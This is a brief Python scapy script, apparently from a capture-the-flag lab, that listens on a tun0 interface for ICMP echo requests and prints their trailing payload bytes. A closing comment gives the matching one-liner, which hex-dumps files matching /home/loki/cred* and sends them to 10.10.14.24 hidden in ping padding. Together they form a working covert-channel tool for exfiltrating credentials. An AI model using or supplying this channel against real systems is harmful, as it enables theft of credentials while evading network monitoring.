from scapy.all import *

def fn(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 8:
            print((pkt[ICMP].load[-4:]).decode('UTF-8'),flush=True,end='')
sniff(iface="tun0", prn=fn)
#xxd -p -c 4 /home/loki/cred* | while read line; do ping -c 1 -p $line 10.10.14.24; done
